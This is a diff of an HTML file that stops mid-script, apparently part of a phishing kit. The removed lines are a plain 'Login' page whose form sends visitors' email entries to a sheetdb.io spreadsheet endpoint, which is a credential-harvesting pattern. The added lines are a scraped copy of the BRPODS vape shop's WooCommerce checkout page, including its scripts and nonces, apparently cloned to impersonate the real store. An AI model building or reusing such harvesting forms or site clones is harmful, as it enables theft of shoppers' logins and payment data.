@@ -1,98 +1,1641 @@
 <!DOCTYPE html>
+<!--[if IE 8]>
+<html class="ie ie8" lang="pt-BR">
+<![endif]-->
+<!--[if !(IE 7) & !(IE 8)]><!-->
 <html lang="pt-BR">
+<!--<![endif]-->
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f0f0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .login-container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            width: 300px;
-        }
-        h2 {
-            margin-bottom: 20px;
-            font-size: 24px;
-            text-align: center;
-            color: #333;
-        }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            font-size: 16px;
-        }
-        button:hover {
-            background-color: #0056b3;
-        }
-    </style>
-</head>
-<body>
 
-    <div class="login-container">
-        <h2>Login</h2>
-        <form action="https://sheetdb.io/api/v1/sukxyvcd371y0" method="POST" id="Login">
-            <label for="username">Email</label>
-            <input type="text" id="username" name="email" placeholder="Digite seu email" required>
+
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KLTRDHR" height="0" width="0" style="display:none;visibility:hidden" aria-hidden="true"></iframe></noscript>
+ <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<link rel="profile" href="https://gmpg.org/xfn/11">
+<link rel="pingback" href="https://brpods.com/xmlrpc.php">
+<meta name="robots" content="noindex, follow" />
+
+<script data-cfasync="false" data-pagespeed-no-defer>
+	var gtm4wp_datalayer_name = "dataLayer";
+	var dataLayer = dataLayer || [];
+	const gtm4wp_use_sku_instead = false;
+	const gtm4wp_currency = 'BRL';
+	const gtm4wp_product_per_impression = false;
+	const gtm4wp_clear_ecommerce = false;
+</script>
+
+
+<title>Checkout - BRPODS</title>
+<link rel="canonical" href="https://brpods.com/checkout/" />
+<meta property="og:locale" content="pt_BR" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Checkout - BRPODS" />
+<meta property="og:url" content="https://brpods.com/checkout/" />
+<meta property="og:site_name" content="BRPODS" />
+<meta property="article:modified_time" content="2020-11-22T16:52:08+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebPage","@id":"https://brpods.com/checkout/","url":"https://brpods.com/checkout/","name":"Checkout - BRPODS","isPartOf":{"@id":"https://brpods.com/#website"},"datePublished":"2019-12-22T10:18:37+00:00","dateModified":"2020-11-22T16:52:08+00:00","breadcrumb":{"@id":"https://brpods.com/checkout/#breadcrumb"},"inLanguage":"pt-BR","potentialAction":[{"@type":"ReadAction","target":["https://brpods.com/checkout/"]}]},{"@type":"BreadcrumbList","@id":"https://brpods.com/checkout/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Início","item":"https://brpods.com/"},{"@type":"ListItem","position":2,"name":"Checkout"}]},{"@type":"WebSite","@id":"https://brpods.com/#website","url":"https://brpods.com/","name":"BRPODS","description":"Venda de Vapes Online Brasil I JUUL, Ignite e outros vapes.","publisher":{"@id":"https://brpods.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://brpods.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"pt-BR"},{"@type":"Organization","@id":"https://brpods.com/#organization","name":"BRPods","url":"https://brpods.com/","logo":{"@type":"ImageObject","inLanguage":"pt-BR","@id":"https://brpods.com/#/schema/logo/image/","url":"https://brpods.com/wp-content/uploads/2020/09/brpods-logo.jpeg","contentUrl":"https://brpods.com/wp-content/uploads/2020/09/brpods-logo.jpeg","width":1200,"height":1200,"caption":"BRPods"},"image":{"@id":"https://brpods.com/#/schema/logo/image/"}}]}</script>
+
+<link rel="dns-prefetch" href="//stats.wp.com" />
+<link rel="dns-prefetch" href="//sdk.mercadopago.com" />
+<link rel="dns-prefetch" href="//fonts.googleapis.com" />
+<link rel="dns-prefetch" href="//facebook.com" />
+<link rel="dns-prefetch" href="//connect.facebook.net" />
+<link rel="dns-prefetch" href="//staticxx.facebook.com" />
+<link rel="dns-prefetch" href="//fbcdn-profile-a.akamaihd.net" />
+<link rel="dns-prefetch" href="//ajax.googleapis.com" />
+<link rel="dns-prefetch" href="//i.ytimg.com" />
+<link rel="dns-prefetch" href="//google-analytics.com" />
+<link rel="dns-prefetch" href="//maps.google.com" />
+<link rel="dns-prefetch" href="//addthis.com" />
+<link rel="dns-prefetch" href="//m.addthisedge.com" />
+<link href="https://fonts.gstatic.com" crossorigin rel="preconnect" />
+<link rel="alternate" type="application/rss+xml" title="Feed para BRPODS &raquo;" href="https://brpods.com/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Feed de comentários para BRPODS &raquo;" href="https://brpods.com/comments/feed/" />
+<link rel="stylesheet" id="structured-content-frontend-css" href="https://brpods.com/wp-content/plugins/structured-content/dist/blocks.style.build.css?ver=1.6.2" type="text/css" media="all" />
+<link rel="stylesheet" id="wp-block-library-css" href="https://brpods.com/wp-includes/css/dist/block-library/style.css?ver=6.5.5" type="text/css" media="all" />
+<style id="classic-theme-styles-inline-css" type="text/css">
+/**
+ * These rules are needed for backwards compatibility.
+ * They should match the button element rules in the base theme.json file.
+ */
+.wp-block-button__link {
+	color: #ffffff;
+	background-color: #32373c;
+	border-radius: 9999px; /* 100% causes an oval, but any explicit but really high value retains the pill shape. */
+
+	/* This needs a low specificity so it won't override the rules from the button element if defined in theme.json. */
+	box-shadow: none;
+	text-decoration: none;
+
+	/* The extra 2px are added to size solids the same as the outline versions.*/
+	padding: calc(0.667em + 2px) calc(1.333em + 2px);
+
+	font-size: 1.125em;
+}
+
+.wp-block-file__button {
+	background: #32373c;
+	color: #ffffff;
+	text-decoration: none;
+}
+
+</style>
+<style id="global-styles-inline-css" type="text/css">
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255, 255, 255, 1), 6px 6px rgba(0, 0, 0, 1);--wp--preset--shadow--crisp: 6px 6px 0px rgba(0, 0, 0, 1);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}body .is-layout-flex{flex-wrap: wrap;align-items: center;}body .is-layout-flex > *{margin: 0;}body .is-layout-grid{display: grid;}body .is-layout-grid > *{margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+.wp-block-navigation a:where(:not(.wp-element-button)){color: inherit;}
+:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}
+:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}
+.wp-block-pullquote{font-size: 1.5em;line-height: 1.6;}
+</style>
+<link rel="stylesheet" id="thwcfd-checkout-style-css" href="https://brpods.com/wp-content/plugins/woo-checkout-field-editor-pro/public/assets/css/thwcfd-public.min.css?ver=6.5.5" type="text/css" media="all" />
+<link rel="stylesheet" id="select2-css" href="https://brpods.com/wp-content/plugins/woocommerce/assets/css/select2.css?ver=8.6.1" type="text/css" media="all" />
+<style id="woocommerce-inline-inline-css" type="text/css">
+.woocommerce form .form-row .required { visibility: visible; }
+</style>
+<link rel="stylesheet" id="wc_mercadopago_checkout_components-css" href="https://brpods.com/wp-content/plugins/woocommerce-mercadopago/assets/css/checkouts/mp-plugins-components.css?ver=7.6.1" type="text/css" media="all" />
+<link rel="stylesheet" id="js_composer_front-css" href="https://brpods.com/wp-content/plugins/js_composer/assets/css/js_composer.min.css?ver=7.7.2" type="text/css" media="all" />
+<link rel="stylesheet" id="bootstrap-css" href="https://brpods.com/wp-content/themes/basel/css/bootstrap.min.css?ver=555.4.0" type="text/css" media="all" />
+<link rel="stylesheet" id="basel-style-css" href="https://brpods.com/wp-content/themes/basel/style.css?ver=555.4.0" type="text/css" media="all" />
+<link rel="stylesheet" id="vc_font_awesome_5_shims-css" href="https://brpods.com/wp-content/plugins/js_composer/assets/lib/vendor/node_modules/@fortawesome/fontawesome-free/css/v4-shims.min.css?ver=7.7.2" type="text/css" media="all" />
+<link rel="stylesheet" id="vc_font_awesome_5-css" href="https://brpods.com/wp-content/plugins/js_composer/assets/lib/vendor/node_modules/@fortawesome/fontawesome-free/css/all.min.css?ver=7.7.2" type="text/css" media="all" />
+<link rel="stylesheet" id="xts-google-fonts-css" href="//fonts.googleapis.com/css?family=Roboto%3A100%2C100italic%2C300%2C300italic%2C400%2C400italic%2C500%2C500italic%2C700%2C700italic%2C900%2C900italic&#038;ver=555.4.0" type="text/css" media="all" />
+<style id="rocket-lazyload-inline-css" type="text/css">
+.rll-youtube-player{position:relative;padding-bottom:56.23%;height:0;overflow:hidden;max-width:100%;}.rll-youtube-player iframe{position:absolute;top:0;left:0;width:100%;height:100%;z-index:100;background:0 0}.rll-youtube-player img{bottom:0;display:block;left:0;margin:auto;max-width:100%;width:100%;position:absolute;right:0;top:0;border:none;height:auto;cursor:pointer;-webkit-transition:.4s all;-moz-transition:.4s all;transition:.4s all}.rll-youtube-player img:hover{-webkit-filter:brightness(75%)}.rll-youtube-player .play{height:72px;width:72px;left:50%;top:50%;margin-left:-36px;margin-top:-36px;position:absolute;background:url(https://brpods.com/wp-content/plugins/wp-rocket/assets/img/youtube.png) no-repeat;cursor:pointer}
+</style>
+<script type="text/template" id="tmpl-variation-template">
+	<div class="woocommerce-variation-description">{{{ data.variation.variation_description }}}</div>
+	<div class="woocommerce-variation-price">{{{ data.variation.price_html }}}</div>
+	<div class="woocommerce-variation-availability">{{{ data.variation.availability_html }}}</div>
+</script>
+<script type="text/template" id="tmpl-unavailable-variation-template">
+	<p>Desculpe, este produto não está disponível. Escolha uma combinação diferente.</p>
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/dist/vendor/wp-polyfill-inert.js?ver=3.1.2" id="wp-polyfill-inert-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/dist/vendor/regenerator-runtime.js?ver=0.14.0" id="regenerator-runtime-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/dist/vendor/wp-polyfill.js?ver=3.15.0" id="wp-polyfill-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/dist/hooks.js?ver=2e6d63e772894a800ba8" id="wp-hooks-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://stats.wp.com/w.js?ver=202435" id="woo-tracks-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/jquery/jquery.js?ver=3.7.1" id="jquery-core-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/jquery-blockui/jquery.blockUI.js?ver=2.7.0-wc.8.6.1" id="jquery-blockui-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-add-to-cart-js-extra">
+/* <![CDATA[ */
+var wc_add_to_cart_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","i18n_view_cart":"Ver carrinho","cart_url":"https:\/\/brpods.com\/cart\/","is_cart":"","cart_redirect_after_add":"yes"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/add-to-cart.js?ver=8.6.1" id="wc-add-to-cart-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="zxcvbn-async-js-extra">
+/* <![CDATA[ */
+var _zxcvbnSettings = {"src":"https:\/\/brpods.com\/wp-includes\/js\/zxcvbn.min.js"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/zxcvbn-async.js?ver=1.0" id="zxcvbn-async-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/dist/i18n.js?ver=2aff907006e2aa00e26e" id="wp-i18n-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wp-i18n-js-after">
+/* <![CDATA[ */
+wp.i18n.setLocaleData( { 'text direction\u0004ltr': [ 'ltr' ] } );
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="password-strength-meter-js-extra">
+/* <![CDATA[ */
+var pwsL10n = {"unknown":"N\u00edvel de seguran\u00e7a da senha desconhecido","short":"Muito fraca","bad":"Fraca","good":"M\u00e9dio","strong":"Forte","mismatch":"Incompat\u00edvel"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="password-strength-meter-js-translations">
+/* <![CDATA[ */
+( function( domain, translations ) {
+	var localeData = translations.locale_data[ domain ] || translations.locale_data.messages;
+	localeData[""].domain = domain;
+	wp.i18n.setLocaleData( localeData, domain );
+} )( "default", {"translation-revision-date":"2024-05-03 12:41:18+0000","generator":"GlotPress\/4.0.1","domain":"messages","locale_data":{"messages":{"":{"domain":"messages","plural-forms":"nplurals=2; plural=n > 1;","lang":"pt_BR"},"%1$s is deprecated since version %2$s! Use %3$s instead. Please consider writing more inclusive code.":["%1$s est\u00e1 obsoleta desde a vers\u00e3o %2$s. Use %3$s como alternativa. Considere escrever um c\u00f3digo mais inclusivo."]}},"comment":{"reference":"wp-admin\/js\/password-strength-meter.js"}} );
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-admin/js/password-strength-meter.js?ver=6.5.5" id="password-strength-meter-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-password-strength-meter-js-extra">
+/* <![CDATA[ */
+var wc_password_strength_meter_params = {"min_password_strength":"3","stop_checkout":"","i18n_password_error":"Digite uma senha segura.","i18n_password_hint":"Dica: A senha deve ter pelo menos doze caracteres. Para torn\u00e1-la mais forte, use letras mai\u00fasculas e min\u00fasculas, n\u00fameros e s\u00edmbolos como ! \" ? $ % ^ & )."};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/password-strength-meter.js?ver=8.6.1" id="wc-password-strength-meter-js" defer="defer" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/js-cookie/js.cookie.js?ver=2.1.4-wc.8.6.1" id="js-cookie-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="woocommerce-js-extra">
+/* <![CDATA[ */
+var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/woocommerce.js?ver=8.6.1" id="woocommerce-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-country-select-js-extra">
+/* <![CDATA[ */
+var wc_country_select_params = {"countries":"{\"BR\":{\"AC\":\"Acre\",\"AL\":\"Alagoas\",\"AP\":\"Amap\\u00e1\",\"AM\":\"Amazonas\",\"BA\":\"Bahia\",\"CE\":\"Cear\\u00e1\",\"DF\":\"Distrito Federal\",\"ES\":\"Esp\\u00edrito Santo\",\"GO\":\"Goi\\u00e1s\",\"MA\":\"Maranh\\u00e3o\",\"MT\":\"Mato Grosso\",\"MS\":\"Mato Grosso do Sul\",\"MG\":\"Minas Gerais\",\"PA\":\"Par\\u00e1\",\"PB\":\"Para\\u00edba\",\"PR\":\"Paran\\u00e1\",\"PE\":\"Pernambuco\",\"PI\":\"Piau\\u00ed\",\"RJ\":\"Rio de Janeiro\",\"RN\":\"Rio Grande do Norte\",\"RS\":\"Rio Grande do Sul\",\"RO\":\"Rond\\u00f4nia\",\"RR\":\"Roraima\",\"SC\":\"Santa Catarina\",\"SP\":\"S\\u00e3o Paulo\",\"SE\":\"Sergipe\",\"TO\":\"Tocantins\"}}","i18n_select_state_text":"Selecione uma op\u00e7\u00e3o\u2026","i18n_no_matches":"Nenhuma combina\u00e7\u00e3o foi encontrada","i18n_ajax_error":"O carregando falhou","i18n_input_too_short_1":"Digite 1 ou mais caracteres","i18n_input_too_short_n":"Digite %qty% ou mais caracteres","i18n_input_too_long_1":"Exclua 1 caracter","i18n_input_too_long_n":"Exclua %qty% caracteres","i18n_selection_too_long_1":"Voc\u00ea pode apenas selecionar 1 item","i18n_selection_too_long_n":"Voc\u00ea pode apenas selecionar %qty% itens","i18n_load_more":"Carregando mais resultados\u2026","i18n_searching":"Procurando\u2026"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/country-select.js?ver=8.6.1" id="wc-country-select-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-address-i18n-js-extra">
+/* <![CDATA[ */
+var wc_address_i18n_params = {"locale":"{\"BR\":{\"postcode\":[]},\"default\":{\"first_name\":{\"required\":true,\"class\":[\"form-row-first\"],\"autocomplete\":\"given-name\"},\"last_name\":{\"required\":true,\"class\":[\"form-row-last\"],\"autocomplete\":\"family-name\"},\"company\":{\"class\":[\"form-row-wide\"],\"autocomplete\":\"organization\",\"required\":false},\"country\":{\"type\":\"country\",\"required\":true,\"class\":[\"form-row-wide\",\"address-field\",\"update_totals_on_change\"],\"autocomplete\":\"country\"},\"address_1\":{\"required\":true,\"class\":[\"form-row-wide\",\"address-field\"],\"autocomplete\":\"address-line1\"},\"address_2\":{\"label_class\":[\"screen-reader-text\"],\"class\":[\"form-row-wide\",\"address-field\"],\"autocomplete\":\"address-line2\",\"required\":false},\"city\":{\"required\":true,\"class\":[\"form-row-wide\",\"address-field\"],\"autocomplete\":\"address-level2\"},\"state\":{\"type\":\"state\",\"required\":true,\"class\":[\"form-row-wide\",\"address-field\"],\"validate\":[\"state\"],\"autocomplete\":\"address-level1\"},\"postcode\":{\"required\":true,\"class\":[\"form-row-wide\",\"address-field\"],\"validate\":[\"postcode\"],\"autocomplete\":\"postal-code\"},\"0\":\"first_name\",\"1\":\"last_name\",\"2\":\"company\",\"3\":\"address_1\",\"4\":\"address_2\",\"5\":\"country\",\"6\":\"city\",\"7\":\"state\",\"8\":\"postcode\",\"9\":\"phone\"}}","locale_fields":"{\"address_1\":\"#billing_address_1_field, #shipping_address_1_field\",\"address_2\":\"#billing_address_2_field, #shipping_address_2_field\",\"state\":\"#billing_state_field, #shipping_state_field, #calc_shipping_state_field\",\"postcode\":\"#billing_postcode_field, #shipping_postcode_field, #calc_shipping_postcode_field\",\"city\":\"#billing_city_field, #shipping_city_field, #calc_shipping_city_field\"}","i18n_required_text":"obrigat\u00f3rio","i18n_optional_text":"opcional"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/address-i18n.js?ver=8.6.1" id="wc-address-i18n-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-checkout-js-extra">
+/* <![CDATA[ */
+var wc_checkout_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":"\/?wc-ajax=%%endpoint%%","update_order_review_nonce":"494aa6c057","apply_coupon_nonce":"c6421cd7af","remove_coupon_nonce":"75ee3605bd","option_guest_checkout":"yes","checkout_url":"\/?wc-ajax=checkout","is_checkout":"1","debug_mode":"","i18n_checkout_error":"Erro ao finalizar a compra. Tente novamente."};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woocommerce/assets/js/frontend/checkout.js?ver=8.6.1" id="wc-checkout-js" data-wp-strategy="defer"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wp-nonce-melhor-evio-wp-api-js-after">
+/* <![CDATA[ */
+var wpApiSettingsMelhorEnvio = {"nonce_configs":"4b5e14ae93","nonce_orders":"d2c53f9113","nonce_tokens":"fa27887767","nonce_users":"6050d398a2"};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/js_composer/assets/js/vendors/woocommerce-add-to-cart.js?ver=7.7.2" id="vc_woocommerce-add-to-cart-js-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-content/plugins/woo-payment-discounts/assets/js/wpd_custom.js?ver=6.5.5" id="woo-payment-discounts-js"></script>
+<!--[if lt IE 9]>
+<script type="text/javascript" src="https://brpods.com/wp-content/themes/basel/js/html5.min.js?ver=555.4.0" id="basel_html5shiv-js"></script>
+<![endif]-->
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/underscore.min.js?ver=1.13.4" id="underscore-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wp-util-js-extra">
+/* <![CDATA[ */
+var _wpUtilSettings = {"ajax":{"url":"\/wp-admin\/admin-ajax.php"}};
+/* ]]> */
+</script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" src="https://brpods.com/wp-includes/js/wp-util.js?ver=6.5.5" id="wp-util-js"></script>
+<script type="b19bda5e6f031c08c895a890-text/javascript" id="wc-add-to-cart-variation-js-extra">
+/* <![CDATA[ */
